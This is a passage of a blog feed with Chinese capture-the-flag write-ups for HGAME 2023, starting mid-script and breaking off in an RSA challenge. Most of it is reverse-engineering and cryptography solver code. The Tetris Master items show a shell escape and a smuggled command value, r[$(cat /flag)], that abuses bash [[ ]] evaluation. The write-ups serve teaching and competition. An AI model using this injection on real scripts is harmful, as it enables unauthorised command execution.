class="number">0x1F36</span>) + num[<span class="number">2</span>] + <span class="number">39058</span> + num[<span class="number">3</span>] * <span class="number">57549</span> + (num[<span class="number">4</span>] ^ <span class="number">0xD0C0</span>) + num[<span class="number">5</span>] * <span class="number">4275</span> + num[<span class="number">6</span>] - <span class="number">48863</span> + (num[<span class="number">7</span>] ^ <span class="number">0xD88C</span>) + (num[<span class="number">8</span>] ^ <span class="number">0xA40</span>) + (num[<span class="number">9</span>] ^ <span class="number">0x3554</span>) + num[<span class="number">10</span>] + <span class="number">62231</span> + num[<span class="number">11</span>] + <span class="number">19456</span> + num[<span class="number">12</span>] - <span class="number">13195</span> == <span class="number">13863722</span>)</span><br><span class="line"></span><br><span class="line">s.add(num[<span class="number">0</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;h&#x27;</span>)^c[<span class="number">0</span>])</span><br><span class="line">s.add(num[<span class="number">1</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;g&#x27;</span>)^c[<span class="number">1</span>])</span><br><span class="line">s.add(num[<span class="number">2</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)^c[<span class="number">2</span>])</span><br><span class="line">s.add(num[<span class="number">3</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>)^c[<span class="number">3</span>])</span><br><span class="line">s.add(num[<span class="number">4</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;e&#x27;</span>)^c[<span class="number">4</span>])</span><br><span class="line">s.add(num[<span class="number">5</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;&#123;&#x27;</span>)^c[<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line">m = s.model()</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    key.append(m[num[i]].as_long())</span><br><span class="line"></span><br><span class="line">flag = [(c[i]^key[i%<span class="number">13</span>])%<span class="number">128</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;z3_1s_very_u5eful_1n_rever5e_engin3ering&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="patchme"><a href="#patchme" class="headerlink" title="patchme"></a>patchme</h3><blockquote><p>不会pwn的re手不是一个好CTFer！游戏规则：修复程序中的二进制安全漏洞，要求能严格执行原程序的正常功能且不变动文件大小，如果修复成功，在运行后输入任何内容即可输出flag。附件更新，增加部分源码以作提示：<a href="https://share.weiyun.com/Kj85naWl">https://share.weiyun.com/Kj85naWl</a></p></blockquote><p>在 <code>init()</code> 中调用 <code>sub_1887()</code>，而 <code>sub_1887()</code> 里对 <code>loc_14C6</code> 区域的数据进行异或 <code>0x66</code> 操作，类似于SMC反调试，用IDA代码还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">static main()</span><br><span class="line">&#123;</span><br><span class="line">    auto addr = <span class="number">0x0014c6</span>;</span><br><span class="line">    auto i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">960</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PatchByte(addr+i,Byte(addr+i)^<span class="number">0x66</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>0x14CA</code> 处按P识别为函数 <code>sub_14CA()</code>，看到主要逻辑为字符两两异或操作，还原即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">s</span>):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">        res += <span class="built_in">list</span>(long_to_bytes(k)[::-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">x = [<span class="number">0x5416D999808A28FA</span>,<span class="number">0x588505094953B563</span>,<span class="number">0xCE8CF3A0DC669097</span>,<span class="number">0x4C5CF3E854F44CBD</span>,<span class="number">0xD144E49916678331</span>,<span class="number">0xDA616BAC</span>,<span class="number">0xBBD0</span>,<span class="number">0x55</span>]</span><br><span class="line">y = [<span class="number">0x3B4FA2FCEDEB4F92</span>,<span class="number">0x7E45A6C3B67EA16</span>,<span class="number">0xAFE1ACC8BF12D0E7</span>,<span class="number">0x132EC3B7269138CE</span>,<span class="number">0x8E2197EB7311E643</span>,<span class="number">0xAE540AC1</span>,<span class="number">0xC9B5</span>,<span class="number">0x28</span>]</span><br><span class="line"></span><br><span class="line">x = change(x)</span><br><span class="line">y = change(y)</span><br><span class="line"></span><br><span class="line">flag = [x[i]^y[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;You_4re_a_p@tch_master_0r_reverse_ma5ter&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h3><blockquote><p>C++是一门非常好的语言，他好就好在了逆向比较难😜</p></blockquote><p>去了符号，IDA分析伪码很难看，分析主要加密逻辑在 <code>sub_1400026A0()</code>，vftable中分别有 <code>encrypt1</code> 和 <code>encrypt2</code>，对应的函数表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">encrypt1</span><br><span class="line">sub_140001600 0</span><br><span class="line"></span><br><span class="line">encrypt2</span><br><span class="line">sub_140002E60 0</span><br><span class="line">sub_140001710 8</span><br><span class="line">sub_140001E30 16</span><br><span class="line">sub_1400022F0 24</span><br><span class="line">sub_1400027A0 32</span><br><span class="line">sub_140002B90 40</span><br><span class="line">sub_140003080 48</span><br></pre></td></tr></table></figure><p><code>encrypt1</code> 中 <code>sub_140001600()</code> 为异或操作，<code>encrypt2</code> 中一系列操作为加密运算+最后比对密文。</p><p>输入测试数据，在最后的密文比对函数 <code>sub_140003080()</code> 下断点，动调提取出测试数据对应的加密结果以及异或操作的key值，根据key值和明密文来确定异或计算逻辑为，每4位密文反向异或每4位key值。</p><p>最后用实际密文与key异或操作还原明文：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">key = [</span><br><span class="line">  <span class="number">0x4E</span>, <span class="number">0xA0</span>, <span class="number">0x37</span>, <span class="number">0x40</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0xDA</span>, <span class="number">0xFD</span>, <span class="number">0x21</span>, <span class="number">0xFA</span>, </span><br><span class="line">  <span class="number">0x6E</span>, <span class="number">0x3C</span>, <span class="number">0xAF</span>, <span class="number">0xD9</span>, <span class="number">0x9C</span>, <span class="number">0xCF</span>, <span class="number">0xB9</span>, <span class="number">0x47</span>, <span class="number">0x33</span>, <span class="number">0x67</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x4E</span>, <span class="number">0xEC</span>, <span class="number">0x0D</span>, <span class="number">0xD1</span>, <span class="number">0xC4</span>, <span class="number">0x80</span>, <span class="number">0x13</span>, <span class="number">0x32</span>, <span class="number">0xA9</span>, </span><br><span class="line">  <span class="number">0xB2</span>, <span class="number">0x3A</span>, <span class="number">0xA7</span>, <span class="number">0x50</span>, <span class="number">0x5D</span>, <span class="number">0x02</span>, <span class="number">0x82</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x83</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = [</span><br><span class="line">  <span class="number">0x28</span>, <span class="number">0x50</span>, <span class="number">0xC1</span>, <span class="number">0x23</span>, <span class="number">0x98</span>, <span class="number">0xA1</span>, <span class="number">0x41</span>, <span class="number">0x36</span>, <span class="number">0x4C</span>, <span class="number">0x31</span>, </span><br><span class="line">  <span class="number">0xCB</span>, <span class="number">0x52</span>, <span class="number">0x90</span>, <span class="number">0xF1</span>, <span class="number">0xAC</span>, <span class="number">0xCC</span>, <span class="number">0x0F</span>, <span class="number">0x6C</span>, <span class="number">0x2A</span>, <span class="number">0x89</span>, </span><br><span class="line">  <span class="number">0x7F</span>, <span class="number">0xDF</span>, <span class="number">0x11</span>, <span class="number">0x84</span>, <span class="number">0x7F</span>, <span class="number">0xE6</span>, <span class="number">0xA2</span>, <span class="number">0xE0</span>, <span class="number">0x59</span>, <span class="number">0xC7</span>, </span><br><span class="line">  <span class="number">0xC5</span>, <span class="number">0x46</span>, <span class="number">0x5D</span>, <span class="number">0x29</span>, <span class="number">0x38</span>, <span class="number">0x93</span>, <span class="number">0xED</span>, <span class="number">0x15</span>, <span class="number">0x7A</span>, <span class="number">0xFF</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">4</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(c[i]^key[i+<span class="number">3</span>]) + <span class="built_in">chr</span>(c[i+<span class="number">1</span>]^key[i+<span class="number">2</span>]) + <span class="built_in">chr</span>(c[i+<span class="number">2</span>]^key[i+<span class="number">1</span>]) + <span class="built_in">chr</span>(c[i+<span class="number">3</span>]^key[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;Cpp_1s_much_m0r3_dlff1cult_th4n_C&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)&lt;br&gt;线上赛平台：&lt;a href=&quot;https://hgame.vidar.club/&quot;&gt;https://hgame.vidar.club&lt;/a&gt;&lt;br&gt;请尽</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023赛" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HGAME 2023 Week 2</title>
    <link href="https://lazzzaro.github.io/2023/01/20/match-HGAME-2023-Week-2/"/>
    <id>https://lazzzaro.github.io/2023/01/20/match-HGAME-2023-Week-2/</id>
    <published>2023-01-20T09:25:16.000Z</published>
    <updated>2023-01-20T11:58:46.830Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)<br>线上赛平台：<a href="https://hgame.vidar.club/">https://hgame.vidar.club</a><br>请尽快注册，注册时请选择校外选手，注册将于 1 月 12 日 20:00 关闭<br>本次比赛的奖励事宜以及赛后沟通反馈以邮件为主，请各位使用真实的邮件地址<br>比赛奖金(针对校外榜)：<br>第1名：1000Pwnhub金币<br>第2名：800Pwnhub金币<br>第3名：600Pwnhub金币<br>4-10名：300Pwnhub金币<br>补充说明：排行榜分数相同者，以先达到该分数的时间次序划定排名，每位获奖选手额外赠送 Pwnhub 邀请码一个<br>注意：<br>* 所有选手均以个人为单位参赛；<br>* 在解题过程中遇到瓶颈或困难可以私聊出题人<br>* 禁止所有破坏比赛公平公正的行为，如：散播或与其他人交换 Flag、解题思路，对平台、参赛者或其他人员进行攻击。违者分数作废并取消比赛资格。<br>* HGAME 线上赛分为四周，每周至官方wp发布前前禁止一切讨论本周题目以及公开自己 wp 的行为。在收集完成后会开放讨论，但仅能讨论已结束的题目。<br>* 每周比赛结束后本周前20名需提交wp到指定邮箱<br>本比赛最终解释权归 Vidar-Team 所有</p><p><strong>Rank: 8</strong></p><hr><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Tetris-Master"><a href="#Tetris-Master" class="headerlink" title="Tetris Master"></a>Tetris Master</h3><blockquote><p>你是否已经厌倦了普通的游戏题目，对于写脚本玩游戏感到无聊？ 此题你需要能够实现RCE，拿到根目录下的flag，又或者你是真正的Tetris Master？ </p><p>请使用ssh进行连接，账号为ctf,密码为hgame，例如ssh ctf@week-2.hgame.lwsec.cn -p port。并且你需要将终端的字体调小，使窗口大小至少为 200 * 70 才能正常进行游戏。</p><p>HINTS:</p><p>题目描述已更新，同时由于存在非预期，题目分数降至50,并上线100分的Revenge版本。</p></blockquote><p>连接：<code>ssh ctf@week-2.hgame.lwsec.cn -p 32150</code></p><p>按 Ctrl+C 强制结束拿到shell，<code>cat flag</code> 得flag：<code>hgame&#123;Bash_Game^Also*Can#Rce&#125;</code>。</p><p>​    </p><h3 id="Tetris-Master-Revenge"><a href="#Tetris-Master-Revenge" class="headerlink" title="Tetris Master Revenge"></a>Tetris Master Revenge</h3><blockquote><p>the same as Tetris Master</p></blockquote><p>bash命令执行，参考ByteCTF 2022 - bash_game，在读入 <code>target</code> 值进入 <code>paint_game_over()</code> 内，比较时 <code>[[]]</code> 操作符会造成RCE。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">paint_game_over</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> xcent=$((`tput lines`/<span class="number">2</span>)) ycent=$((`tput cols`/<span class="number">2</span>))</span><br><span class="line">    <span class="built_in">local</span> x=$((xcent-<span class="number">4</span>)) y=$((ycent-<span class="number">25</span>))</span><br><span class="line">    <span class="keyword">for</span> (( i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ )); <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> -ne <span class="string">&quot;\033[<span class="subst">$((x+i)</span>);<span class="variable">$&#123;y&#125;</span>H\033[44m<span class="variable">$&#123;good_game[$i]&#125;</span>\033[0m&quot;</span>;</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$master</span>&quot;</span> -eq <span class="string">&quot;y&quot;</span> ]] &amp;&amp; [[ <span class="string">&quot;<span class="variable">$score</span>&quot;</span> -gt 50000 ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> -ne <span class="string">&quot;\033[<span class="subst">$((x+3)</span>);<span class="subst">$((ycent+1)</span>)H\033[44m`cat /flag`\033[0m&quot;</span>;</span><br><span class="line">    <span class="keyword">elif</span> [[ <span class="string">&quot;<span class="variable">$master</span>&quot;</span> -ne <span class="string">&quot;y&quot;</span> ]] &amp;&amp; [[ <span class="string">&quot;<span class="variable">$score</span>&quot;</span> -gt <span class="string">&quot;<span class="variable">$target</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> -ne <span class="string">&quot;\033[<span class="subst">$((x+3)</span>);;<span class="subst">$((ycent+1)</span>)H\033[44mKeep Going\033[0m&quot;</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="built_in">echo</span> -ne <span class="string">&quot;\033[<span class="subst">$((x+3)</span>);<span class="subst">$((ycent+1)</span>)H\033[44m<span class="variable">$&#123;score&#125;</span>\033[0m&quot;</span>;</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ssh连接，选择 <code>n</code>，输入目标分数 <code>r[$(cat /flag)]</code>，确认进入游戏，快速结束一局后在结果处以报错形式输出flag：<code>hgame&#123;Bash_Game^Also*Can#Rce^reVenge!!!!&#125;</code>。</p><p>​    </p><h3 id="Sign-In-Pro-Max"><a href="#Sign-In-Pro-Max" class="headerlink" title="Sign In Pro Max"></a>Sign In Pro Max</h3><blockquote><p>兔兔没有抢到回家的车票，一个猫猫头像的学长给了他一个候补车票抢票软件，但是这个软件的验证码太难了，你能帮他解一下吗？ flag 英文字母为全小写，自行使用 hgame{}包裹后提交</p></blockquote><p>五个部分：</p><p>Part1：base64+base58+base32，得到 <code>f51d3a18</code>；</p><p>Part2：md5，得到 <code>f91c</code>；</p><p>Part3：sha1，得到 <code>4952</code>；</p><p>Part4：sha256，得到 <code>a3ed</code>；</p><p>Part5：rot21，得到 <code>Part5 is 0bc0ea61d21c, now put all the parts together, don&#39;t forget the format.</code></p><p>按UUID格式连接得flag： <code>hgame&#123;f51d3a18-f91c-4952-a3ed-0bc0ea61d21c&#125;</code>。</p><p>​    </p><h3 id="crazy-qrcode"><a href="#crazy-qrcode" class="headerlink" title="crazy_qrcode"></a>crazy_qrcode</h3><blockquote><p>兔兔在买年货,但是看着商家的付款二维码犯了难</p></blockquote><p>png图片的二维码无法扫描，使用<a href="https://merricx.github.io/qrazybox/">QRazyBox</a>导入，利用自带工具 Brute-force Format Info Pattern 可以得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Decoded Message :</span><br><span class="line">QDjkXkpM0BHNXujs</span><br><span class="line">Error Correction Level : H</span><br><span class="line">Mask Pattern : 4</span><br></pre></td></tr></table></figure><p>使用 <code>QDjkXkpM0BHNXujs</code> 解压zip压缩包，得到25张分割的二维码图片，以及一个25长度的数组。</p><p>1为90°旋转，2为180°旋转，3为270°旋转，0为不旋转，?为需选择其中一个值调整。</p><p>按照5×5拼接好后扫描得到flag：<code>hgame&#123;Cr42y_qrc0de&#125;</code>。</p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Rabin"><a href="#Rabin" class="headerlink" title="Rabin"></a>Rabin</h3><blockquote><p>看起来非常像RSA呢。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">kbits</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(kbits)</span><br><span class="line">        q = getPrime(kbits)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> q % <span class="number">4</span>== <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line">p ,q = gen_key(<span class="number">256</span>)</span><br><span class="line">   flag =  <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">   pt = bytes_to_long(flag)</span><br><span class="line">   c = <span class="built_in">pow</span>(pt, <span class="number">2</span>, p*q)</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">print</span>(<span class="string">f&quot;p=<span class="subst">&#123;p&#125;</span>\nq=<span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">f&quot;c=<span class="subst">&#123;<span class="built_in">hex</span>(c)[<span class="number">2</span>:]&#125;</span>&quot;</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p=65428327184555679690730137432886407240184329534772421373193521144693375074983</span></span><br><span class="line"><span class="string">q=98570810268705084987524975482323456006480531917292601799256241458681800554123</span></span><br><span class="line"><span class="string">   c=4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span></span><br><span class="line"><span class="string">   &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>$e=2$，Rabin算法解RSA。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span><br><span class="line">n = p * q</span><br><span class="line">mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">yp = gmpy2.invert(p, q)</span><br><span class="line">yq = gmpy2.invert(q, p)</span><br><span class="line">r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">rr = n - r</span><br><span class="line">s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">ss = n - s</span><br><span class="line"><span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"> </span><br><span class="line">p = <span class="number">65428327184555679690730137432886407240184329534772421373193521144693375074983</span></span><br><span class="line">q = <span class="number">98570810268705084987524975482323456006480531917292601799256241458681800554123</span></span><br><span class="line">c = <span class="number">0x4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span></span><br><span class="line">m = rabin_decrypt(c,p,q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[i])[<span class="number">2</span>:]))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;That&#x27;5_s0_3asy_to_s@lve_r@bin&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="RSA-大冒险1"><a href="#RSA-大冒险1" class="headerlink" title="RSA 大冒险1"></a>RSA 大冒险1</h3><blockquote><p>马上要过年喽，兔兔开心地去超市买年货，但是超市门口却写着”只有完成挑战才能进入超市”，你能帮帮兔兔吗</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge1.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall1_secret</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.e = <span class="number">65537</span></span><br><span class="line">        self.p = getPrime(<span class="number">128</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">100</span>)</span><br><span class="line">        self.r = getPrime(<span class="number">100</span>)</span><br><span class="line">        self.m = chall1_secret</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.p*self.q*self.r)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.p*self.q*self.r, self.e, self.p</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge2.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall2_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.p = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.e = <span class="number">65537</span></span><br><span class="line">        self.m = chall2_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_ ,self.e, self.p*self.q)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.p*self.q, self.e</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge3.py</span></span><br><span class="line"><span class="keyword">from</span> 